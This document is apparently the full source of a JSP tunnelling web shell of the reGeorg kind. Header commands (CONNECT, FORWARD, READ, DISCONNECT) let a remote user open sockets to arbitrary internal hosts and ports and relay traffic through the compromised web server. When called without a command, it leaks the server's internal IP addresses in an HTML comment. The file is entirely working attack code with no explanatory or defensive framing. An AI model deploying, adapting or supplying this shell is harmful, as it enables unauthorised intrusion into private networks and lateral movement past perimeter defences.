<%@page import="java.nio.ByteBuffer, java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.IOException, java.net.UnknownHostException, java.net.Socket,java.util.HashSet,java.net.InetAddress,java.net.NetworkInterface,java.net.SocketException,java.util.Enumeration,java.util.Iterator,java.util.Set" trimDirectiveWhitespaces="true"%><%
    String cmd = request.getHeader("X-CMD");
    if (cmd != null) {
        response.setHeader("X-STATUS", "OK");
        if (cmd.compareTo("CONNECT") == 0) {
            try {
                String target = request.getHeader("X-TARGET");
                int port = Integer.parseInt(request.getHeader("X-PORT"));
                SocketChannel socketChannel = SocketChannel.open();
                socketChannel.connect(new InetSocketAddress(target, port));
                socketChannel.configureBlocking(false);
                session.setAttribute("socket", socketChannel);
                response.setHeader("X-STATUS", "OK");
            } catch (UnknownHostException e) {
                System.out.println(e.getMessage());
                response.setHeader("X-ERROR", e.getMessage());
                response.setHeader("X-STATUS", "FAIL");
            } catch (IOException e) {
                System.out.println(e.getMessage());
                response.setHeader("X-ERROR", e.getMessage());
                response.setHeader("X-STATUS", "FAIL");
                
            }
        } else if (cmd.compareTo("DISCONNECT") == 0) {
            SocketChannel socketChannel = (SocketChannel)session.getAttribute("socket");
            try{
                socketChannel.socket().close();
            } catch (Exception ex) {
                System.out.println(ex.getMessage());
            }
            session.invalidate();
        } else if (cmd.compareTo("READ") == 0){
            SocketChannel socketChannel = (SocketChannel)session.getAttribute("socket");
            try {            
                ByteBuffer buf = ByteBuffer.allocate(512);
                int bytesRead = socketChannel.read(buf);
                ServletOutputStream so = response.getOutputStream();
                while (bytesRead > 0){
                    so.write(buf.array(),0,bytesRead);
                    so.flush();
                    buf.clear();
                    bytesRead = socketChannel.read(buf);
                }
                response.setHeader("X-STATUS", "OK");
                so.flush();
                so.close();            
                
            } catch (Exception e) {
                System.out.println(e.getMessage());
                response.setHeader("X-ERROR", e.getMessage());
                response.setHeader("X-STATUS", "FAIL");
                //socketChannel.socket().close();
            }        
            
        } else if (cmd.compareTo("FORWARD") == 0){
            SocketChannel socketChannel = (SocketChannel)session.getAttribute("socket");
            try {
                
                int readlen = request.getContentLength();
                byte[] buff = new byte[readlen];

                request.getInputStream().read(buff, 0, readlen);
                ByteBuffer buf = ByteBuffer.allocate(readlen);
                buf.clear();
                buf.put(buff);
                buf.flip();

                while(buf.hasRemaining()) {
                    socketChannel.write(buf);
                }
                response.setHeader("X-STATUS", "OK");
                //response.getOutputStream().close();
                
            } catch (Exception e) {
                System.out.println(e.getMessage());
                response.setHeader("X-ERROR", e.getMessage());
                response.setHeader("X-STATUS", "FAIL");
                socketChannel.socket().close();
            }
        } 
    } else 
    {
        try {
        String szIp = "";
            Set<InetAddress> addrs = new HashSet<InetAddress>();
            Enumeration<NetworkInterface> ns = null;
            try {
                ns = NetworkInterface.getNetworkInterfaces();
            } catch (SocketException e) {
                // ignored...
            }
            while (ns != null && ns.hasMoreElements()) 
            {
                NetworkInterface n = ns.nextElement();
                Enumeration<InetAddress> is = n.getInetAddresses();
                while (is.hasMoreElements()) {
                    InetAddress i = is.nextElement();
                    if (!i.isLoopbackAddress() && !i.isLinkLocalAddress() && !i.isMulticastAddress()) szIp += "," + i.getHostAddress();
                }
            }
            out.print("<!-- ip:" + szIp + " -->");  
        } catch (Exception e) {
            // ignored...
        }

        //PrintWriter o = response.getWriter();  
        out.print("<!-- Georg says, 'All seems fine' -->"); 
    }
%>